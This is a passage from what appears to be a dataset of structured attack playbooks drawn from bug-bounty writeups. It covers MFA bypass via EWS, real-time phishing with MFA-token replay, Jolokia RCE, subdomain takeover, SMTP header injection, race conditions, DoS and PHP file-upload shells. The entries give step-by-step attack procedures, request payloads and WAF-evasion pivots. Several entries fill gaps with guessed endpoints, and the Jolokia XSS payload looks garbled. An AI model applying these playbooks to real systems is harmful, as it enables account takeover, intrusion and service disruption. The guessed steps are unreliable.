Step 3: Conduct subdomain enumeration on both the primary domain (.com) and the authentication domain (.net), specifically looking for mail-related subdomains (e.g., mail.target.com, outlook.target.com).
Step 4: Attempt to locate the EWS endpoint behind discovered subdomains. Common patterns include /ews/exchange.asmx.
attack_steps: Step 1: Attempt to log in to the ADFS endpoint using the found domain credentials. If the account is unenrolled with MFA, login will fail.
Step 2: Navigate to the identified EWS endpoint using the found domain credentials. This endpoint might bypass the MFA requirement for OWA.
Step 3: If login to EWS is successful, use a tool like MailSniper to access the mailbox and potentially dump the Global Address List (GAL).
Step 4: Optionally, attempt password spraying against other service accounts found in the GAL using the compromised password.
payloads_or_patterns: Service account username and password found via recon (e.g., svc_nameofsvc:Password123)
tools_recommended: GitHub (for credential recon)
Subdomain enumeration tools (e.g., Subfinder, Amass)
MailSniper (for accessing EWS and dumping GAL)
Burp Suite or similar proxy (for intercepting and analyzing requests)
success_indicators: Successful login to the EWS endpoint without MFA prompt using compromised domain credentials.
Ability to read emails or access mailbox content via MailSniper.
Successful dump of the Global Address List (GAL) using MailSniper.
failure_indicators: 401 Unauthorized or redirection to MFA prompt on EWS endpoint. Suggestion: Re-verify subdomain enumeration and EWS endpoint path. If all attempts fail, the EWS misconfiguration might not be present.
MailSniper fails to connect or retrieve mail. Suggestion: Verify EWS endpoint functionality and permissions.

playbooks.impact: Bypass of Multi-Factor Authentication (MFA) on OWA, leading to unauthorized access to user mailboxes. Potential for dumping the Global Address List (GAL), revealing user information, and enabling further attacks like password spraying against other service accounts.
playbooks.key_lesson: Always investigate mail-related subdomains for EWS endpoints, as they can sometimes bypass OWA's primary authentication, including MFA, if misconfigured.

meta.title: Replying on LiveStream leading to Page Admin Disclosure

trigger_conditions.when_to_apply: When an authenticated user can initiate a Facebook LiveStream and interact with comments while acting as a Page.
prerequisites: Attacker must have an authenticated Facebook account.
Attacker must be able to start a LiveStream on a Facebook Page they administer or have posting rights to.
applicability_signals: Ability to start a LiveStream from a Facebook Page.
Observation that comments made during a LiveStream originate from the user's personal profile, even when the LiveStream is initiated from a Page context.
skip_if: If comments made during a Page's LiveStream always correctly attribute to the Page and not the personal profile.

recon_steps: Step 1: Log in to a Facebook account that has administrative privileges for a Facebook Page.
Step 2: Initiate a LiveStream on the test Facebook Page.
Step 3: Observe the interaction context for comments and replies during the LiveStream.
attack_steps: Step 1: Initiate a LiveStream on a Facebook Page as an administrator.
Step 2: Have another user (or a separate account) comment on the LiveStream.
Step 3: Reply to the comment made by the other user.
Step 4: Observe the attribution of the reply (whether it appears as from the personal profile or the Page).
payloads_or_patterns: N/A (relying on UI interaction and observation)
tools_recommended: Facebook Web App
Facebook Mobile App (iPad as per writeup)
Two authenticated Facebook accounts (one for the attacker, one for a collaborator/victim page).
success_indicators: The reply to a comment on the Page's LiveStream is attributed to the attacker's personal profile instead of the Page.
The comment and reply chain shows the attacker's personal profile interacting with another user's comment on a Page's LiveStream.
failure_indicators: Replies always correctly attribute to the Facebook Page.
No option to reply directly to a comment within the LiveStream interface.

playbooks.impact: Disclosure of Page Admin identity to users who comment on the Page's LiveStream, potentially revealing the personal identity of the Page administrator and enabling targeted social engineering or harassment.
playbooks.key_lesson: When interacting as a Page, always verify that all outgoing actions (comments, replies, posts) are correctly attributed to the Page and not the underlying personal account.

meta.title: Bug bounty bout report 0x01 - WebRTC edition

target_profile.technology: WebRTC infrastructure, TURN servers, Coturn, Jitsi Meet

trigger_conditions.when_to_apply: When a target utilizes WebRTC and potentially exposes a TURN server. The vulnerability is related to the configuration and access control of the TURN relay.
prerequisites: Target has a WebRTC infrastructure in scope.
Target uses a TURN server.
applicability_signals: Discovery of a TURN server endpoint.
Misconfigured TURN server allowing relay of traffic to arbitrary destinations.
skip_if: Target does not expose any WebRTC services or TURN server.
TURN server is properly configured with strict peer access control.

recon_steps: Step 1: Identify potential WebRTC endpoints and associated TURN server IPs/hostnames.
Step 2: Probe identified TURN servers for open relay capabilities. This may involve attempting to establish a connection and send data through the relay to an external service.
attack_steps: Step 1: Send traffic through the identified TURN relay to an external IP address controlled by the attacker (e.g., a Burp Collaborator or attacker-controlled server).
Step 2: Observe if the traffic is successfully relayed and if any response or callback is received on the attacker-controlled endpoint.
payloads_or_patterns: Insufficient detail in writeup. Actual payloads would depend on the specific TURN server configuration and the desired target for the relay.
Example concept: Construct a STUN/TURN message that attempts to relay arbitrary data through the server.
tools_recommended: Wireshark: To analyze WebRTC and STUN/TURN traffic.
Custom scripts: To automate the probing of TURN relays and analyze responses.
Burp Suite Collaborator: To receive callbacks from relayed traffic.
success_indicators: Successful relay of traffic from the TURN server to an attacker-controlled external destination.
Receiving a callback or response on the attacker-controlled server that originated from the target's TURN relay.
failure_indicators: TURN server rejects the relay attempt with an error code.
No traffic is relayed to the external destination, and no callbacks are received.

playbooks.impact: An attacker can use the TURN relay to bypass network restrictions, perform scanning of internal networks, or hide their origin for malicious activities. In some cases, it might lead to denial-of-service if abused to flood specific targets.
playbooks.key_lesson: Always verify the access control and relay configurations of TURN servers used in WebRTC deployments to prevent open relay abuse.

meta.title: How I made more than $30K with Jolokia CVEs

trigger_conditions.when_to_apply: When a Jolokia agent is exposed and accessible to an authenticated user, allowing for JMX operations to be performed.
prerequisites: Jolokia agent is deployed and accessible on the target application.
The attacker has authenticated access to the application that exposes the Jolokia agent.
applicability_signals: An endpoint similar to '/jolokia/' responds to requests.
Requests to the Jolokia endpoint return JSON responses containing JMX information.
skip_if: Jolokia endpoint is not accessible.
Jolokia endpoint returns errors indicating it's not enabled or configured.
Jolokia requests are blocked by a WAF or access control.

recon_steps: Step 1: Identify potential Jolokia endpoints by fuzzing common paths like '/jolokia/' on the target application.
Step 2: Send a basic Jolokia request (e.g., GET /jolokia/list) to confirm the agent is active and to enumerate available JMX MBeans.
attack_steps: Step 1: Craft a Jolokia request to execute arbitrary commands via JMX. For RCE, this typically involves using MBeans that allow command execution (e.g., `java.lang:type=OperatingSystem`, `Runtime` MBean).
Step 2: For information disclosure, query specific MBeans that expose sensitive configuration or runtime data.

Step 3: For Reflected XSS, craft requests where user-supplied input can be reflected in the Jolokia response in an HTML context, or leverage JMX outputs that might be interpreted as HTML by browsers if not properly sanitized.
Step 4: Observe the responses for command output, leaked information, or reflected XSS payloads.
payloads_or_patterns: For Reflected XSS (example payload targeting a parameter that might be reflected): {"type":"exec","mbean":"java.lang:type=Runtime","attribute":"exec","arguments":["<script>alert(document.domain)</script>"]}
tools_recommended: curl: To send crafted Jolokia requests.
Burp Suite: To intercept and modify requests, and for fuzzing.
success_indicators: For RCE: Successful execution of commands on the target server (e.g., file creation, process listing, reverse shell connection).
For Information Disclosure: Sensitive data (configuration details, environment variables, user data) present in the response.
For Reflected XSS: Execution of JavaScript in the victim's browser (e.g., alert box, cookie access).
failure_indicators: 400/404 errors on Jolokia endpoint: Jolokia not running or misconfigured. → Try other attack vectors.
Jolokia response indicates unsupported operation: The specific MBean or operation is not available or restricted. → Enumerate other MBeans or operations.
No command output or data leakage: Command failed or sensitive data is not exposed via queryable MBeans. → Try different commands or MBeans.
WAF blocks requests: Jolokia requests are being filtered. → Obfuscate payloads or use different encoding.

playbooks.impact: Remote Code Execution on the server, unauthorized access to sensitive information, or Cross-Site Scripting for user accounts.
playbooks.key_lesson: Always enumerate and test JMX MBeans exposed by the Jolokia agent for execution of arbitrary commands or sensitive information disclosure, especially when authenticated access is available.

meta.title: All *.intercom.help subdomains vulnerable to Subdomain Takeover from intercom Service

trigger_conditions.when_to_apply: When a subdomain of `intercom.help` is found to be misconfigured and pointing to an intercom service that is no longer actively managed by the target.
prerequisites: A wildcard DNS record `*.intercom.help` is in place and misconfigured.
applicability_signals: Subdomains with an `intercom.help` suffix are observed in DNS records or during reconnaissance.
The subdomain's DNS records point to an Intercom-related service.
The target has a Bugcrowd program and mentions Intercom.
skip_if: All subdomains are correctly configured and actively managed by Intercom.
The DNS records for the subdomain do not point to an Intercom service.

recon_steps: Step 1: Use a subdomain enumeration tool (e.g., Subfinder, Amass) to discover subdomains of `intercom.help`.
Step 2: Analyze the DNS records for discovered subdomains to identify those pointing to Intercom infrastructure or services.
attack_steps: Step 1: Identify a subdomain of `intercom.help` that is not actively used or is misconfigured.

Step 2: Attempt to claim the subdomain by configuring a new service that fulfills the requirements of the Intercom service (e.g., creating a new Intercom account or support page that registers the subdomain).
Step 3: Observe if the subdomain now resolves to the newly configured service instead of an expected Intercom page or resource.
payloads_or_patterns: N/A (This is a DNS configuration vulnerability, not a payload injection attack)
tools_recommended: Subfinder for subdomain enumeration
Amass for subdomain enumeration
Online DNS lookup tools (e.g., dnschecker.org) to verify DNS records
Intercom documentation to understand service requirements for subdomain registration.
success_indicators: The previously unclaimed subdomain now resolves to the attacker-controlled service (e.g., a custom page, a redirect to an attacker-controlled domain).
Confirmation that the subdomain takeover is successful by accessing the subdomain via a web browser.
failure_indicators: The subdomain continues to resolve to a valid Intercom page or resource.
The DNS configuration cannot be modified or does not allow for the takeover.
Intercom's service actively rejects the takeover attempt due to existing configurations or security measures.

playbooks.impact: Attacker can host malicious content, phishing pages, or redirect traffic intended for the intercom.help domain to their own controlled infrastructure, potentially leading to credential theft or brand impersonation.
playbooks.key_lesson: Always verify DNS configurations for subdomains associated with your services, especially those using third-party providers like Intercom, to prevent unauthorized takeover.

meta.title: SMTP Injection in Gsuite

affected_components: Gmail advanced settings: Routing (custom subject header)
tech_stack_fingerprints: Apps -> G Suite -> Settings for Gmail -> Advanced settings -> Routing

trigger_conditions.when_to_apply: When an administrator has access to G Suite's Gmail advanced routing settings and can configure custom subjects for emails.
prerequisites: Attacker must have administrative access to a G Suite domain.
applicability_signals: The presence of the 'Advanced settings' section for Gmail routing, specifically the 'custom subject' option.
skip_if: The 'custom subject' option is not available or is disabled for the administrator.

recon_steps: Step 1: Log in to admin.google.com with administrative credentials.
Step 2: Navigate to Apps -> G Suite -> Settings for Gmail -> Advanced settings -> Routing.
attack_steps: Step 1: Add a new routing setting or edit an existing one.
Step 2: In the 'Custom subject' field, inject newline characters ('\r\n') followed by desired email headers.
Step 3: Observe the email headers of a test email sent through the configured routing rule.
Step 4: If the newline characters are processed and split the 'Subject' header, further headers can be injected on new lines to manipulate the email.
tools_recommended: Burp Suite (or any intercepting proxy) to precisely control the input to the 'Custom subject' field.
success_indicators: The injected 'Subject' header appears as a separate header in the received email, and subsequent injected headers (e.g., 'From', 'To') are also parsed correctly, allowing for email spoofing from Google's servers.
failure_indicators: The newline characters are stripped or encoded, and the 'Custom subject' remains a single line. The system might also reject the input with an error. If this happens, check for other injection vectors or WAF rules.

playbooks.impact: Ability to spoof email messages originating from Google's servers for the affected G Suite domain, leading to phishing, business email compromise, and reputational damage.
playbooks.key_lesson: Always inspect how user-controlled input, especially in configuration interfaces, is handled when it's passed to underlying protocols like SMTP, as newline injection can lead to header manipulation and protocol-level vulnerabilities.

meta.title: Another "Fappening" on the Horizon?

tech_stack_fingerprints: HTML source code for iCloud login page

trigger_conditions.when_to_apply: When the target's authentication mechanism does not support FIDO U2F and relies on less secure MFA methods, allowing for real-time credential replay and session hijacking.
prerequisites: Victim must be tricked into visiting a phishing site.
Victim must enter their username and password into the phishing site.
Victim must then enter their MFA token into the phishing site.
The target's MFA token must have a short expiry or be susceptible to real-time replay.
applicability_signals: The target uses a multi-factor authentication system.
The target's login page HTML can be cloned.
The target's MFA implementation does not enforce FIDO U2F.
skip_if: The target strictly enforces FIDO U2F for all authentication.
The target's MFA tokens have an extremely short lifespan that makes real-time replay infeasible.
The target's session management is highly resilient to replay attacks.

recon_steps: Step 1: Identify target web applications that use multi-factor authentication. (e.g., Apple iCloud)
Step 2: Attempt to download the HTML source code of the login page. Verify if it can be cloned to an attacker-controlled server.
Step 3: Analyze the target's MFA implementation. Check for support of FIDO U2F. If not supported, this vulnerability is likely applicable.
attack_steps: Step 1: Clone the HTML source code of the target's login page.
Step 2: Host the cloned HTML on an attacker-controlled web server.
Step 3: Modify the 'action' attribute of the login form to point to an attacker-controlled handler (e.g., a Python Flask application).
Step 4: Configure the handler to capture the submitted username, password, and MFA token.
Step 5: In real-time, replay the captured credentials and MFA token to the legitimate target login page using a tool like Selenium.
Step 6: If the login is successful, capture the session token or cookie from the legitimate site.
Step 7: Use the captured session token to maintain persistence by leveraging the 'trust this browser' feature, which does not require re-entry of the second factor.
payloads_or_patterns: HTML source code of the target login page, modified to POST to attacker endpoint.
Python Flask handler to capture POST data and replay using Selenium.

Example POST request structure (to be replayed): POST /login HTTP/1.1
Host: <TARGET_LOGIN_HOST>
Content-Type: application/x-www-form-urlencoded

username=<USER>&password=<PASS>&mfa_token=<TOKEN>
tools_recommended: Burp Suite: To intercept and analyze login requests and responses.
Python with Flask: To host the phishing page and handle POST requests.
Selenium WebDriver: To automate the real-time replay of credentials and MFA tokens to the legitimate site.
success_indicators: Successful login to the legitimate target account using replayed credentials and MFA token.
Ability to access user data or perform actions as the victim after session hijacking.
Successful establishment of persistence through the 'trust this browser' mechanism without requiring MFA.
failure_indicators: Phishing page fails to capture credentials correctly (e.g., incomplete POST data).
Real-time replay of credentials and MFA token results in an invalid session or error from the target site (e.g., 401 Unauthorized, MFA token expired).
MFA prompt is not bypassed by the 'trust this browser' feature on subsequent login attempts.

playbooks.impact: Complete account takeover of the victim's iCloud account, allowing access to all associated data (emails, photos, documents, contacts, etc.), and potentially further impersonation or privacy violations.
playbooks.key_lesson: When a target's MFA does not support FIDO U2F, investigate the feasibility of real-time credential replay attacks against their login flow, especially if session persistence mechanisms do not re-prompt for MFA.

meta.title: Privilege escalation in Partners Portal to Admin access

affected_components: Partners Portal user management / invitation system
tech_stack_fingerprints: Specific Partner Portal functionalities related to user invitations and roles

trigger_conditions.when_to_apply: When an authenticated user in the Partners Portal can trigger or resend invitations for other users and has visibility into the invitation status.
prerequisites: Attacker must have an authenticated account in the Facebook Partners Portal.
applicability_signals: Ability to view or manage invitations in the Partners Portal.
Functionality to send or resend invitations to new users.
Visibility into user roles or statuses within the portal.
skip_if: Invitation functionality is completely locked down or lacks any discoverable logic.
No clear path to escalate privileges through invitation manipulation is evident.

recon_steps: Step 1: Log in to the Facebook Partners Portal with an existing account.
Step 2: Explore the user management and invitation sections to understand the current functionalities, available roles, and invitation flows.
Step 3: Identify if it's possible to resend invitations or if there's any logic related to invitation acceptance or role assignment that can be manipulated.
attack_steps: Step 1: Initiate an invitation to a new email address or to an existing user whose role is unknown.
Step 2: Observe the response or behavior when resending an invitation. If possible, try to trigger an invitation to an administrative-level email or a known admin account.

Step 3: If a specific API endpoint is responsible for sending/resending invitations, attempt to manipulate parameters within that request, focusing on role assignment or user privileges. The writeup implies a direct manipulation of the invitation process to grant admin access, rather than a complex bypass.

Step 4: If a confirmation of invitation sent exists, try to confirm if resending the invitation to a specific email address with presumed admin privileges results in a successful escalation or a confirmation that the user is already an admin with elevated access.
payloads_or_patterns: Insufficient detail in writeup. Likely involves manipulating invitation parameters or using existing invitation features in unintended ways.
tools_recommended: Burp Suite (for intercepting and modifying requests related to invitations)
success_indicators: Gaining administrative access to the Partners Portal through an escalated account or by controlling an admin account.
Receiving confirmation that the invited user has been granted admin privileges.
Ability to perform administrative actions within the Partners Portal that were previously restricted.
failure_indicators: Invitation attempts fail or are rejected with error messages indicating insufficient privileges.
No change in access level is observed after attempting to manipulate the invitation process.
Resending invitations only results in standard user invitations without any privilege escalation.

playbooks.impact: Gaining administrative access to the Facebook Partners Portal, allowing control over partner accounts, data, and configurations.
playbooks.key_lesson: Always scrutinize invitation and user management functionalities for privilege escalation opportunities, especially when different user roles exist.

meta.title: Disclose internal files related to testing of some Facebook tools

tech_stack_fingerprints: Facebook domain cookies (e.g., c_user, xs, sb)
Likely uses internal Facebook infrastructure and CDNs

trigger_conditions.when_to_apply: When internal testing files are accessible via predictable or guessable URLs on Facebook's infrastructure or CDNs, or when URL signature generation mechanisms are vulnerable.
prerequisites: Attacker has knowledge of potential internal file paths or naming conventions.
applicability_signals: Discovery of endpoints that appear to serve internal testing artifacts.
Endpoints that allow for the generation of URLs for user-uploaded content or CDN-hosted files.
skip_if: All requests to potential internal paths return 404 or 403.
WAF blocks requests attempting to access sensitive internal paths.
No identifiable patterns for internal file naming or URL structures.

recon_steps: Step 1: Analyze discovered Facebook CDN URLs or internal file paths from other related bugs (e.g., 'Generate valid signatures for files hosted in Facebook CDNs').
Step 2: Attempt to identify common prefixes, suffixes, or structures used for internal testing files on Facebook's domains or associated CDNs.
Step 3: Look for any documentation or mentions of internal testing practices or file structures within publicly available Facebook developer documentation or bug bounty writeups.
attack_steps: Step 1: Send GET requests to hypothesized internal file paths (e.g., /testing/configs/, /internal_data/, /dev_scripts/) on Facebook domains and associated CDNs.
Step 2: If a mechanism to regenerate URL signatures for user-uploaded content exists, attempt to exploit it to access other users' files or testing artifacts.
Step 3: If specific tools or services are mentioned in related writeups (e.g., 'Facebook tools'), attempt to find endpoints related to their testing infrastructure.
payloads_or_patterns: Generate signed URLs for known file patterns and try accessing them.
tools_recommended: Burp Suite Intruder: For fuzzing common internal path patterns.
Custom scripts: To automate the enumeration of potential internal file paths and URL signature generation.
success_indicators: Receiving a 200 OK response with content that appears to be internal testing files, configurations, scripts, or data.
Successful access to files or objects that should not be publicly accessible.
failure_indicators: All requests return 404 or 403 → focus on other potential information disclosure vectors or try different path enumeration techniques.
Responses contain generic error messages or are empty → the identified paths are not exploitable or do not exist.

playbooks.impact: Disclosure of internal files related to testing of Facebook tools, which could reveal sensitive information about Facebook's internal infrastructure, development processes, or unreleased features. This could aid attackers in finding further vulnerabilities.
playbooks.key_lesson: Systematically enumerate and fuzz potential internal file paths and URL structures on CDNs and internal services, especially when related vulnerabilities hint at such mechanisms.

meta.title: Disclose the Instagram account linked to a Facebook user account or page

trigger_conditions.when_to_apply: When an attacker wants to link an Instagram account to a Facebook user account or page and suspects a linkage may exist but is not publicly visible.
prerequisites: Attacker must have an authenticated Facebook account.
applicability_signals: The target system allows linking Facebook accounts/pages to Instagram accounts.
There might be endpoints or functionalities related to account linking or social media integration.
skip_if: The feature to link Instagram accounts to Facebook profiles/pages is not present or is completely locked down.
Instagram accounts are never linked to Facebook user accounts/pages on this platform.

recon_steps: Step 1: Browse the Facebook application for features related to profile settings, page settings, linked accounts, or social media integration.
Step 2: Inspect network traffic while interacting with these features, looking for API calls related to account linking or social media sync.
attack_steps: Step 1: Identify an API endpoint or functionality that handles the linking of an Instagram account to a Facebook user account or page.
Step 2: Attempt to submit a request to this endpoint, providing a known Facebook user ID or page ID.
Step 3: Observe the response for any information that reveals a linked Instagram account (e.g., username, profile picture, or a direct link).
payloads_or_patterns: This exploit likely involves manipulating parameters within an API request related to account linking. Specific payloads depend on the identified endpoint. Example: `POST /api/vX/link_instagram` with `user_id=<FACEBOOK_USER_ID>` and observing the response for `instagram_username`.
tools_recommended: Burp Suite: To intercept and analyze network requests and responses, especially those related to account management and social media integration.
success_indicators: The response contains the Instagram username or a direct URL to the linked Instagram profile for the specified Facebook user ID or page ID.
failure_indicators: Responses indicating a permission error (e.g., 403 Forbidden) might suggest the attacker's account lacks the necessary privileges to perform this action. Responses indicating a valid link doesn't exist (e.g., 404 or a specific error message) mean no Instagram account is linked. Pivot to trying other user IDs or pages.

playbooks.impact: An attacker can discover the Instagram account associated with any Facebook user account or page, potentially leading to further privacy violations or targeted social engineering attacks.
playbooks.key_lesson: Investigate account linking and social media integration features for potential information disclosure vulnerabilities, as they can reveal connections between different user profiles.

meta.title: Internal directories enumeration in www

trigger_conditions.when_to_apply: This technique applies when an attacker can interact with URLs on the Facebook web application that might reveal internal directory structures or file paths.
prerequisites: None specified, but likely requires the ability to make requests to `www.facebook.com`.
applicability_signals: The writeup mentions 'Internal directories enumeration in www' as a finding, suggesting that certain request patterns or responses might indicate this vulnerability.
Look for endpoints or functionalities that handle or display file paths or internal resources.
skip_if: If all requests to `www.facebook.com` are heavily rate-limited or blocked without any identifiable patterns that could lead to directory enumeration.

recon_steps: Step 1: Analyze common URL patterns on `www.facebook.com` to identify potential entry points for path traversal or directory listing.
Step 2: Look for areas where file paths or directory structures are exposed in responses, such as error messages, debug information, or resource loading.
attack_steps: Step 1: Construct URLs with common directory traversal sequences (e.g., `../../..`, `../`) combined with known or guessed internal path components.

Step 2: Observe the server's responses for any indication of successful traversal (e.g., revealing file content, listing directory contents, or providing different error messages compared to invalid paths).
Step 3: Attempt to enumerate common internal directory names (e.g., `admin`, `logs`, `config`, `internal`, `dev`) to map out the internal structure.
tools_recommended: Burp Suite Intruder: To systematically fuzz potential directory paths and traversal sequences.
Dirb/Gobuster: For brute-forcing common directories and files.
success_indicators: Receiving responses that reveal the content of internal files (e.g., `/etc/passwd` content).
Responses that list directory contents instead of a 404 or access denied error.
Error messages that differ significantly from standard 'not found' errors, indicating access to a different file or directory.
failure_indicators: Consistent 404 Not Found or 403 Forbidden responses for all tested paths.
No discernible difference in response behavior when attempting various traversal sequences.

playbooks.impact: Disclosure of sensitive internal directory structures and potentially file contents, which could lead to further exploitation or information gathering.
playbooks.key_lesson: When interacting with web applications, systematically test for directory traversal vulnerabilities by fuzzing URL paths with common traversal sequences and looking for anomalous responses.

meta.title: RACE Condition vulnerability found in bug-bounty program

trigger_conditions.when_to_apply: When a feature allows adding multiple items (e.g., team members, resources) and has a hard limit, and requests can be sent concurrently.
prerequisites: Attacker must be authenticated and have permission to add items to a team/resource.
applicability_signals: The target has a specific limit on the number of items that can be created (e.g., 'admin user is authorized to create ONLY 3 three members').
The 'add member' functionality involves parameters like 'email' and 'name'.
skip_if: The application strictly enforces limits server-side on every individual request without a race condition window.

recon_steps: Step 1: Identify a feature that has a creation limit (e.g., adding users to a team, creating resources).
Step 2: Observe the requests made during the creation process, specifically looking for parameters related to the item being created (e.g., email, name, ID).
attack_steps: Step 1: Capture the 'add team member' request using a proxy like Burp Suite.
Step 2: Identify the parameters that determine the uniqueness or properties of the item being added (e.g., 'email' and 'name').
Step 3: Configure Burp Suite Intruder to send multiple requests for the same 'add member' action concurrently.

Step 4: Set up Intruder with the identified parameters (e.g., 'email' and 'name'). The exact values for these parameters might need to be valid enough to pass initial server-side checks, or they might be part of the race condition exploit if the server doesn't validate them before concurrency.
Step 5: Adjust the number of threads in Burp Intruder to maximize concurrency and send requests rapidly.
Step 6: Start the Intruder attack and monitor the responses.
payloads_or_patterns: Parameters to fuzz in Intruder: 'email', 'name'. Specific values would depend on the target's input requirements. For example, a valid but possibly reusable email and name.
Burp Intruder configuration for concurrency: High number of threads and rapid sending.
tools_recommended: Burp Suite: Intruder module to send concurrent requests, Proxy to capture requests.
success_indicators: The number of created items exceeds the intended limit (e.g., 4 team members created when the limit is 3).
Success indicators are often observed in the application's UI or through API responses showing the increased count.
failure_indicators: All requests result in errors (e.g., 400 Bad Request, 409 Conflict) indicating the limit is enforced per request. Pivot: Look for other functionalities with creation limits or other types of race conditions (e.g., delete/update race conditions).

playbooks.impact: Allows an authenticated user to bypass intended limits, potentially leading to resource exhaustion, unauthorized access, or denial of service, depending on the nature of the created items. In this case, exceeding the team member limit.
playbooks.key_lesson: Always test resource creation functionalities with high concurrency to identify race conditions that bypass set limits.

meta.title: DoS and BugBounties :A series of DoS attacks on HackerOne

affected_components: /group endpoint for creating and listing groups

trigger_conditions.when_to_apply: When testing a web application that allows authenticated users to create and list groups, and lacks sufficient rate limiting or pagination on group creation and listing functionalities.
prerequisites: Attacker must have an authenticated account on the target application.
The target application must have a feature for creating and listing groups.
applicability_signals: Endpoint for creating groups exists.
Endpoint for listing groups exists.
No rate limiting observed on group creation requests.
No pagination observed when listing groups, returning all groups in a single response.
skip_if: Rate limiting is strictly enforced on group creation.
Pagination is correctly implemented for group listing, limiting the number of returned groups.
The server responds with errors or mitigations for excessive requests.

recon_steps: Step 1: Browse the target application to identify features related to group creation and management.
Step 2: Observe the network requests made during group creation and group listing using browser developer tools or a proxy.
attack_steps: Step 1: Create a large number of groups by repeatedly sending POST requests to the group creation endpoint. Use a simple, non-resource intensive payload for group names.
Step 2: Send a GET request to the group listing endpoint to retrieve all created groups. Monitor the response time and server load.

Step 3: If the initial DoS attempt (excessive response time from listing all groups) is not successful or is mitigated, attempt to bypass pagination by using different 'Accept-Encoding' headers (e.g., 'gzip, gzip,deflate,br').
Step 4: If bypassing pagination is successful, attempt to make multiple concurrent requests to the group listing endpoint to overload the server, aiming for a 502 Bad Gateway response.
payloads_or_patterns:
POST /group HTTP/1.1
Host: ctf.hacker101.com
Content-Type: application/x-www-form-urlencoded
Cookie: <SESSION_TOKEN>

group[name]=test_group_<RANDOM_SUFFIX>

GET /group HTTP/1.1
Host: ctf.hacker101.com
Cookie: <SESSION_TOKEN>
Accept-Encoding: gzip, gzip,deflate,br
tools_recommended: Burp Suite (or similar proxy) for intercepting and replaying requests.
Browser developer tools for observing network activity.
A script (e.g., Python with requests library) to automate group creation and concurrent requests.
success_indicators: Significantly increased response time for the group listing endpoint.
Server returning a 502 Bad Gateway error for the group listing endpoint, especially when multiple concurrent requests are made.
Application becoming unresponsive or experiencing performance degradation.
failure_indicators: All group creation requests are rate-limited and rejected with a 429 Too Many Requests.
Group listing endpoint returns paginated results and does not return all groups in a single request.
Server consistently returns 200 OK with reasonable response times even with many groups created.

playbooks.impact: Denial of Service on the target web application, making the group creation and listing features unavailable to legitimate users. This can disrupt user collaboration and the functionality of the CTF platform.
playbooks.key_lesson: Always test for the absence of rate limiting and proper pagination on endpoints that allow resource creation or listing, as these can lead to easily exploitable Denial of Service vulnerabilities.

meta.title: Race Conditions - Exploring the Possibilities

trigger_conditions.when_to_apply: When an application performs a critical action (e.g., user creation, resource modification, coupon redemption) without proper locking mechanisms, allowing multiple concurrent requests to alter the state.
prerequisites: Ability to send multiple concurrent requests to the target endpoint.
Identification of an endpoint that handles state-changing operations where uniqueness or atomicity is expected.
applicability_signals: Endpoints that create unique identifiers (usernames, email addresses) where duplicate entries might be possible under concurrency.
Functionality that involves joining groups or accepting invitations.
Coupon redemption features where a coupon should only be usable once.
skip_if: WAF blocks rapid, concurrent requests.
Application returns consistent, expected errors for duplicate entries even under concurrency.
All requests are rate-limited to an extent that prevents effective concurrency testing.

recon_steps: Step 1: Identify endpoints that handle user registration, group management, or coupon redemption and inspect their functionality to understand state-changing operations.
Step 2: Analyze the request/response flow for these endpoints to identify parameters that should be unique or atomically processed (e.g., username, email, invite token, coupon code).
attack_steps: Step 1: Configure Turbo Intruder with a request targeting a potential race condition endpoint (e.g., submitting registration with the same username/email multiple times concurrently).

Step 2: Modify the Turbo Intruder script to send a high volume of requests to the identified endpoint. For user registration, this would involve sending multiple registration requests with the same desired username/email.
Step 3: For invitation-based joining (e.g., /group/post_join), send multiple requests to join the same group using the same invite token concurrently.
Step 4: For coupon redemption, send multiple requests to redeem the same coupon code concurrently.

Step 5: Monitor the application's state to observe if unintended outcomes occur due to the race condition (e.g., duplicate accounts, ability to remove a non-existent member, multiple redemptions of a single-use coupon).
payloads_or_patterns:
For registration: Multiple requests with the same username and email: `POST /register HTTP/1.1
Host: <TARGET_URL>
Content-Type: application/json

{"username": "testuser", "email": "test@example.com", "password": "password123"}`

For group join: Multiple requests with same invite token: `POST /group/post_join HTTP/1.1
Host: <TARGET_URL>
Cookie: session=<SESSION_TOKEN>
Content-Type: application/json

{"group_id": "<GROUP_ID>", "invite_token": "<INVITE_TOKEN>"}`

For coupon: Multiple requests with same coupon code: `POST /redeem_coupon HTTP/1.1
Host: <TARGET_URL>
Cookie: session=<SESSION_TOKEN>
Content-Type: application/json

{"coupon_code": "SUMMER20"}`
tools_recommended: Burp Suite Turbo Intruder: For sending high-volume concurrent requests.
success_indicators: Successful creation of duplicate user accounts with the same username or email.
Ability to remove a group member who was never successfully added due to a race condition.
Successful redemption of a single-use coupon multiple times.
Unexpected state changes in the application that deviate from the intended single-use or unique identifier logic.
failure_indicators: All concurrent requests result in expected error codes (e.g., 409 Conflict for duplicate username) without any successful duplicate creation → The application likely has proper locking mechanisms.
Requests are consistently blocked or rate-limited, preventing effective concurrency testing → Attempt a different attack vector or analyze rate-limiting policies.

playbooks.impact: Allows attackers to bypass uniqueness constraints, potentially leading to account duplication, unauthorized actions (like removing non-existent members), or resource abuse (like multiple coupon redemptions). This can compromise data integrity and lead to denial of service for legitimate users.
playbooks.key_lesson: Always test state-changing operations in concurrent environments for race conditions by sending a high volume of requests to bypass uniqueness constraints or achieve unintended sequential outcomes.

meta.title: Guest Blog: From File Upload to RCE

tech_stack_fingerprints: Synack platform details in writeup (indicates a platform for security testing)

trigger_conditions.when_to_apply: When a web application allows file uploads without proper validation of file extensions, but does validate Content-Type and file content.
prerequisites: Attacker must have an authenticated session.
applicability_signals: File upload endpoint exists.
Application accepts files with common image extensions (e.g., .jpg, .png).
skip_if: File extension is strictly validated and disallowed if not in an allowed list.
Content-Type header is not checked or is easily spoofed.
File content is thoroughly scanned for malicious code before processing.

recon_steps: Step 1: Identify and interact with any file upload functionalities on the target application. Observe the requests and responses using a proxy like Burp Suite.
attack_steps: Step 1: Upload a seemingly legitimate file (e.g., a JPEG image) with a valid Content-Type header.
Step 2: Analyze the application's response to confirm how it handles the uploaded file. Look for directory paths, filenames, or any processing steps.
Step 3: Attempt to upload a file with a malicious extension (e.g., .php, .jsp, .sh) but maintain a valid Content-Type header of an image file (e.g., `image/jpeg`).

Step 4: Observe if the application allows the upload and processes the file as intended by the attacker, particularly if the server executes the script due to the file's content and the server's interpretation of the extension.
payloads_or_patterns:
Content-Type: image/jpeg

<?php phpinfo(); ?> (saved as shell.php, but Content-Type set to image/jpeg)
tools_recommended: Burp Suite (Proxy, Repeater): To intercept, modify, and re-send HTTP requests, especially for manipulating Content-Type headers and file contents.
success_indicators: The application executes the uploaded script (e.g., a PHP shell).
